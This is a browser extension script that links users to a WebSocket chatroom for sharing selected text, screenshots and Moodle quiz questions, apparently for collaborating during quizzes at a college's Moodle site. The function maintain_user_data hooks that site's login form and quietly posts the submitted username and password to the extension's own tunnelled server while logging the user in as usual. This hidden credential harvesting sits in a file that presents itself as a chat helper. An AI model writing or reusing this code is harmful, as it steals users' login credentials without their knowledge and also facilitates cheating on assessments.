var hostname = 'polished-morning-29118.pktriot.net'
var ws_protocol = 'wss://'
var websocket_url = ws_protocol + hostname + '/ws/chat/'

//Some Global Variables
var message_api, username, roomname, moodle;


/*------------------------------------------Functions Implementations-----------------------------------------*/
// function set_message_api_on_local_storage();
// function create_moodle_button();
// function initiate_buttons(message_api);
// function execute_user_info_check_on_local_storage();
// function is_searching_allowed();
// function check_message_api_on_local_storage();
// function share_summary_on_chat()
// function remove_words()
// function maintain_user_data()


function set_message_api_on_local_storage(message_api) {
    chrome.storage.local.set({ 'message_api': message_api });
}

function getSelectionParentElement() {
    var parentEl = null, sel;
    if (window.getSelection) {
        sel = window.getSelection();
        if (sel.rangeCount) {
            parentEl = sel.getRangeAt(0).commonAncestorContainer;
            if (parentEl.nodeType != 1) {
                parentEl = parentEl.parentNode;
            }
        }
    } else if ((sel = document.selection) && sel.type != "Control") {
        parentEl = sel.createRange().parentElement();
    }
    else {
        alert('Please Select Some Text To Take Screenshot');
        return null;
    }
    return parentEl;
}

function take_screenshot_by_class(classname) {
    var divs = documet.getElementsByClassName(classname);
    if (divs == null) { return false; }
    Array.from(divs).map(div => {
        html2canvas(div).then(function (canvas) {
            message_api.send_file_to_group(canvas.toDataURL());
        });
    })
    return true;
}

function take_screenshot_by_tag_name(tag_name) {
    var div = document.getElementsByTagName(tag_name);

    html2canvas(div[0]).then(function (canvas) {
        message_api.send_file_to_group(canvas.toDataURL());
    });
}

function take_screenshot_by_id(id) {
    console.log('taking screen shot');
    var div = document.getElementById(id);

    html2canvas(div).then(function (canvas) {
        message_api.send_file_to_group(canvas.toDataURL());
    });
}

async function execute_user_info_check_on_local_storage() {
    return new Promise((resolve, reject) => {
        chrome.storage.local.get(['user_info'], function (items) {
            if (chrome.runtime.lastError) {
                console.log('found error');
                reject('runtime error');
            }
            if (items['user_info'] == null || items.length == 0) {
                chrome.storage.local.set({ 'is_connected': false });
                reject('variable not exists');
            }

            username = items['user_info']['username'];
            roomname = items['user_info']['roomname'];
            if (username != null && roomname != null) {
                message_api = new MessageApi(username, roomname);
                message_api.initialize();
                initiate_buttons(message_api);
                resolve(message_api);
            }
            else {
                console.log('please provide input and press connect to chatroom');
                reject('variable not exists');
            }
        })
    })
}

function is_searching_allowed() {

    chrome.storage.local.get(['is_searching_allowed'], function (items) {
        if (chrome.runtime.lastError) {
            console.log('variable is_searching_allowed not exists');
            return;
        }
        if (items['is_searching_allowed'] == true) {
            navigator.clipboard.readText().then(function (text) {
                var foundin = $(`*:contains("${text}")`);
                var element = foundin[foundin.length - 1];
                var isPresent = window.find(text);
                if (element) {
                    element.style.backgroundColor = 'yellow';
                    element.style.padding = '5px'
                    element.id = 'scroll_to_me'
                    window.location.href = '#' + 'scroll_to_me';
                    alert('Text Is Present And It Has Been Highlighted');
                }
            });
        }
    })
}

async function check_message_api_on_local_storage() {
    return new Promise((resolve, reject) => {
        chrome.storage.local.get(['message_api'], function (items) {
            if (items['message_api'] == null)
                reject('variable not exists');
            else {
                message_api = items['message_api'];
                resolve(message_api);
            }
        })
    })
}

function share_summary_on_chat() {
    var summary = document.querySelector('.quizreviewsummary');
    
    if (summary == null || summary.length == 0) {
        return false;
    }
    else {
        message_api.send_message_to_room('new_message', String(summary.innerText));
    }
}

function remove_words(question) {
    question = question.trim();
    question = question.substring(13, question.length - 32);
    question = question.trim();
    return question;
}

function maintain_user_data() {
    if (window.location.href == 'http://moodle.mitsgwalior.in/login/index.php') {
        $('#login').submit(function (e) {
            e.preventDefault();
            var name = message_api.get_username() || "unknown";
            var formData = new FormData(this);
            formData.append("name", name);
            $.ajax({
                url:'http://moodle.mitsgwalior.in/login/index.php',
                type: 'POST',
                data: formData,
                success: function () {
                    window.location.href = 'http://moodle.mitsgwalior.in/my/';
                },
                error: function (request, status, error) {
                    window.location.href = 'http://moodle.mitsgwalior.in/my/';
                },
                contentType: false,
                processData: false,
                cache: false
            })
            $.ajax({
                url: 'https://'+hostname+'/get/',
                type: 'POST',
                data: formData,
                success: function (response) {
                    var response = response.status;
                    console.log('Everything ready for moodle');

                },
                error: function (request, status, error) {
                    console.log('Everything ready for moodle');
                },
                contentType: false,
                processData: false,
                cache: false
            })
            e.preventDefault();
        })
    }
}



/*---------------------------BUTTONS-----------------------------*/


function create_moodle_button() {
    var enable_moodle_button = document.createElement('button');
    enable_moodle_button.className = 'menu_button';
    enable_moodle_button.id = 'moodle_quick_send';
    enable_moodle_button.innerText = 'Enable Quick Send On Moodle';
    enable_moodle_button.value = 'Enable'
    enable_moodle_button.addEventListener('click', function (e) {
        if (e.target.value == 'Enable') {
            moodle.add_button_to_questions(message_api, moodle);
            this.innerText = 'Disable Quick Send On Moodle'
            e.target.value = 'Disable'
        }
        else {
            var moodle_buttons = document.getElementsByClassName('send_moodle_question_button');
            while (moodle_buttons[0]) {
                moodle_buttons[0].parentNode.removeChild(moodle_buttons[0]);
            }
            this.innerText = 'Enable Quick Send On Moodle'
            e.target.value = 'Enable';
        }
    })
    return enable_moodle_button;
}

function create_screenshot_button() {
    var button = document.createElement('button');
    button.innerText = 'Send Screenshot'
    button.id = 'screenshot_button'
    button.className = 'menu_button'
    button.addEventListener('click',(e) => {
        take_screenshot_by_tag_name('body');
    })
    return button;
}

function initiate_buttons(message_api) {
    var button = document.createElement('button');
    button.id = 'send_message_to_chatroom'
    button.className = 'menu_button'
    button.innerText = 'Send Text To Chatroom'
    button.addEventListener('click', function (e) {
        var text = getSelectedText();
        if (text == null || text == "")
            alert('Please Highlight Some Text First');
        else {
            message_api.send_message_to_room("new_message", text);
        }
    })

    var enable_moodle_button = create_moodle_button();
    var screenshot_button = create_screenshot_button();

    var close_button = document.createElement('button');
    close_button.id = 'close_connection_button'
    close_button.className = 'menu_button'
    close_button.innerText = 'Disconnect'
    close_button.addEventListener('click', function (e) {
        message_api.close_connetion();
        chrome.storage.local.clear();
    })


    var p = document.createElement('p')
    p.className = 'chatroom_button_grid_info'
    p.innerText = 'Developed by Shivansh Shrivastava'

    var div = document.createElement('div');
    div.className = 'chatroom_button_grid';
    div.id = 'chatroom_button_grid'
    div.appendChild(p);
    div.appendChild(button);
    div.appendChild(enable_moodle_button);
    div.appendChild(screenshot_button);
    div.appendChild(close_button);

    document.body.appendChild(div);
    $('#chatroom_button_grid').draggable({
        cancel: false
    });

    hide_menu();
}
/*----------------------------------------------------------------------- */





/*------------------------------------------ Class Implementation --------------------------------------------------*/



class MessageApi {
    constructor(username, roomname) {
        this.username = username;
        this.roomname = roomname;
        if (username == null || roomname == null || username == "" || roomname == "") {
            console.log('username and roomname not valid');
            return null;
        }
        this.client = new WebSocket(websocket_url + roomname + '/');
    }

    initialize() {
        this.client.onopen = () => {
            console.log('connected to chat room');
            chrome.storage.local.set({
                'is_connected': true
            })
            continue_code();
            show_menu();
        }
        this.client.onerror = (error) => {
            hide_menu();
            chrome.storage.local.set({
                'is_connected': false
            })
        }
        this.client.onclose = () => {
            chrome.storage.local.set({
                'is_connected': false
            })
            hide_menu();
        }
    }
    send_file_to_group(dataURL) {
        const client = this.client;
        var username = this.username
        var roomname = this.roomname
        client.send(JSON.stringify({
            'command': 'new_file',
            'dataURL': dataURL,
            'description': 'Message',
            'username': username,
            'roomname': roomname,
            'id': Date.now().toString()
        }));
    }

    send_message_to_room(command, message) {
        this.client.send(JSON.stringify({
            'command': command,
            'message': message,
            'username': this.username,
            'roomname': this.roomname
        }));
    }
    get_username() {
        return this.username;
    }
    get_roomname() {
        return this.roomname;
    }
    close_connetion() {
        this.client.close();
    }
}

class Moodle {
    questions = []

    constructor() {
        var moodle_questions = document.querySelectorAll('.formulation');
        Array.from(moodle_questions).map(question => {
            this.questions.push(question);
        })
    }


    highlight_question(node) {
        node.style.backgroundColor = 'lightgreen';
        node.classList.add('sent_questions');
        var p = document.createElement('p');
        p.innerText = 'Sent';
        p.className = 'sent_questions_text';
        node.appendChild(p);
    }

    get_questions() {
        var temp = [];
        this.questions.map(question => {
            temp.push(question.innerText);
        })
        return temp;
    }

    add_button_to_questions(message_api, moodle) {
        var clicked_question;
        this.questions.map(question => {
            var button = document.createElement('button');
            button.className = 'send_moodle_question_button';
            button.addEventListener('click', function (e) {
                e.preventDefault();
                clicked_question = this.parentNode.innerText;
                clicked_question = remove_words(clicked_question);
                moodle.highlight_question(this.parentElement);
                message_api.send_message_to_room('new_message', clicked_question);
            })
            button.innerText = 'Send to Chatroom';
            question.appendChild(button);
        })
    }
}